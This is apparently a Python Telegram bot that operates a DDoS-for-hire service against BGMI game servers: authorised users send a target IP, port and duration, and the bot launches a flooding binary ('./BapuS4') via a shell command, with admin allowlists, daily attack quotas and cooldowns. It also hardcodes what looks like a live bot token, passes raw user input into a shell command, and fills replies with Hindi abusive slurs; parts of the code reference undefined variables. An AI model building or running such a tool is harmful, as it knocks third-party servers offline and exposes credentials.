import telebot
import subprocess
import datetime
import time
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
# Bot initialization
BOT_TOKEN = "7678671603:AAH6T81Ae4kmQJK1JckO3o1NIOmZjizP0Vc"  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin IDs
admin_id = ["7116437453"]  # Replace with your Telegram user ID

# File paths
USER_FILE = "users.txt"

# Constants
default_max_daily_attacks = 5  # Default maximum allowed attacks per user per day
default_cooldown_time = 200  # Default cooldown time in seconds

# Variables
allowed_user_ids = []
user_attack_count = {}
user_attack_limits = {}  # Track custom attack limits for each user
last_attack_time = {}  # Track the time of the last attack for cooldown
active_attacks = {}  # Track active attack processes for each user

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Save allowed users to file
def save_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_user_ids))

# Command: /bgmi (Attack command with cooldown)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        max_attacks = user_attack_limits.get(user_id, default_max_daily_attacks)

        current_time = datetime.datetime.now()
        last_time = last_attack_time.get(user_id, None)

        # Check cooldown
        if last_time:
            time_diff = (current_time - last_time).total_seconds()
            if time_diff < default_cooldown_time:
                remaining_time = default_cooldown_time - time_diff
                bot.reply_to(message, f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙨𝙩𝙞𝙡𝙡 𝙧𝙪𝙣𝙣𝙞𝙣𝙜... {int(remaining_time)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜")
                return

        # Check daily attack limit
        attacks_today = user_attack_count.get(user_id, 0)
        if attacks_today >= max_attacks:
            bot.reply_to(message, f"𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙈𝙖𝙭𝙞𝙢𝙪𝙢  𝘼𝙩𝙩𝙖𝙘𝙠𝙨 ({max_attacks}) \n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖 && 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎")
            return

        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "𝙽𝙾𝚆 𝙱𝙾𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 --> AGYA RANDI KE Pille✅ \n𝚈𝙾𝚄 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙱𝙾𝚃 𝙻𝙸𝙺𝙴 --> \n\n/𝚋𝚐𝚖𝚒 <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>")
            return

        target, port, duration = command[1], int(command[2]), int(command[3])
        if duration > 240:
            bot.reply_to(message, "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 200")
            return

        user_attack_count[user_id] = attacks_today + 1
        last_attack_time[user_id] = current_time

        # Create a "Stop Attack" button
        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("Stop Attack", callback_data=f"stop:{user_id}")
        markup.add(stop_button)

        # Send attack start message with the "Stop Attack" button
        bot.reply_to(message, f"VIP DARK GAMING\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {duration} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══VIP DARK GAMING ➭", reply_markup=markup)

        # Running the attack in a thread to avoid blocking the bot
        def execute_attack(user_id, target, port, duration):
            process = subprocess.Popen(f"./BapuS4 {target} {port} {duration} 1000", shell=True)
            active_attacks[user_id] = process

            # Wait for the process to complete or for the duration to pass
            start_time = time.time()
            while time.time() - start_time < duration:
                if process.poll() is not None:  # Check if the process has finished early
                    break
                time.sleep(1)  # Check every second to avoid busy-waiting

            # Terminate the attack after the duration or if the process finishes
            process.terminate()
            active_attacks.pop(user_id, None)  # Remove the process from active attacks

            # Send a message to the user that the attack was stopped automatically
            bot.send_message(user_id, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 --> 𝙁𝙄𝙉𝙄𝙎𝙃 MAA CHUD GYI TERI\n𝐓𝐚𝐫𝐠𝐞𝐭 {target} 𝐏𝐨𝐫𝐭 {port} 𝐓𝐢𝐦𝐞 {time}\n\n𝙏𝙊𝙏𝘼𝙇 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 --> 5/{remaining_attacks}")

        Thread(target=execute_attack, args=(user_id, target, port, duration)).start()
    else:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬 TERI MAA KA Bhosda")

# Callback handler for stopping the attack
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop:"))
def stop_attack_callback(call):
    user_id = call.data.split(":")[1]  # Extract the user ID from callback data

    if call.from_user.id == int(user_id):  # Ensure the callback is from the attack initiator
        if user_id in active_attacks:
            process = active_attacks[user_id]
            process.terminate()  # Stop the attack process
            active_attacks.pop(user_id, None)  # Remove the process from the active attacks
            bot.edit_message_text("𝗬𝗢𝗨𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣", chat_id=call.message.chat.id, message_id=call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "𝗡𝗢 𝗔𝗡𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗢𝗨𝗡𝗗")
    else:
        bot.answer_callback_query(call.id, "ʏᴏᴜ ᴄᴀɴ ɴᴏᴛ ꜱᴛᴏᴘ ᴀɴᴏᴛʜᴇʀ ᴜꜱᴇʀ ᴀᴛᴛᴀᴄᴋ")

# Command: /adduser (Add a user)
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) != 2:
            bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /add <𝘂𝘀𝗲𝗿_𝗶𝗱>.")
            return
        new_user_id = command[1]
        if new_user_id not in allowed_user_ids:
            allowed_user_ids.append(new_user_id)
            save_users()
            bot.reply_to(message, f"𝗔GYA FIR SE MAA CHUD WANE 💀😈 ")
        else:
            bot.reply_to(message, f"PHLE HI GAND MRALI H TUNE 🔥")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /removeuser (Remove a user)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) != 2:
            bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /𝗿emove <𝘂𝘀𝗲𝗿_𝗶𝗱>")
            return
        remove_user_id = command[1]
        if remove_user_id in allowed_user_ids:
            allowed_user_ids.remove(remove_user_id)
            save_users()
            bot.reply_to(message, f"HTA DIYA RANDI KA Pilla ✅")
        else:
            bot.reply_to(message, f"𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭𝐢𝐧𝐠 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭")
    else:
        bot.reply_to(message, "BHAG JAA TERI BHEN KI CHUT ")

# Command: /setattacks (Admin command to customize a user's remaining attacks)
@bot.message_handler(commands=['setattacks'])
def set_attacks(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) != 3:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝘀𝗲𝘁𝗮𝘁𝘁𝗮𝗰𝗸𝘀 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴_𝗮𝘁𝘁𝗮𝗰𝗸𝘀>")
            return

        target_user_id = command[1]
        try:
            remaining_attacks = int(command[2])
            if remaining_attacks < 0:
                bot.reply_to(message, "ᴿᵉᵐᵃⁱⁿⁱⁿᵍ ᵃᵗᵗᵃᶜᵏˢ ᵐᵘˢᵗ ᵇᵉ ᵃ ⁿᵒⁿ⁻ⁿᵉᵍᵃᵗⁱᵛᵉ ⁿᵘᵐᵇᵉʳ")
                return
        except ValueError:
            bot.reply_to(message, "ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ꜰᴏʀ ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋꜱ")
            return

        # Update the user's attack count
        user_attack_count[target_user_id] = max(0, remaining_attacks)
        bot.reply_to(message, f"ᑌˢⓔＲ - {target_user_id}\n𝑅𝑒𝓈𝑒𝓉 --> {remaining_attacks}💀 \n\n𝗥𝗲𝘀𝗲𝘁 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹 ✅.")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Command: /resetcooldown (Admin command to reset cooldown for all users)
@bot.message_handler(commands=['resetcooldown'])
def reset_cooldown(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        last_attack_time.clear()  # Clear cooldown for all users
        bot.reply_to(message, "𝗖𝗼𝗼𝗹𝗗𝗼𝘄𝗻 𝗥𝗲𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹 ✅")
    else:
        bot.reply_to(message, "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ")

# Start polling
bot.polling()
while True:
    print("Keeping session alive...")
    time.sleep(180)  # 5 minutes
